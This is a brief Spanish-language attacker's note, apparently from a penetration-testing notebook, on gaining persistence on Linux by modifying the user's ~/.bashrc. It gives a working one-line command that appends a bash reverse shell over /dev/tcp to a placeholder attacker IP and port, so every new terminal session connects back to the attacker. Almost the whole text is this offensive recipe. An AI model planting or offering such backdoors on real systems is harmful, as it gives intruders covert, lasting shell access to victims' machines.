- Tags : #persistencia #persistencia_linux #persistencia_bashrc

Aqui lo que haremos es hacer que cuando el usuario accede a la termina se ejecute un codigo para establecer la conexion con la maquina atacante por lo que modificaremos el archivo bashrc para que ejecute el comando , puede ser la zshrc ,shrc cualquier bash que utilice el usuario 

```bash
nano ~/.bashrc

#Agregamos el siguiente codigo en el fichero 

echo 'bash -c "bash -i >& /dev/tcp/ipAtak/port 0>&1"' >> ~/.bashrc
```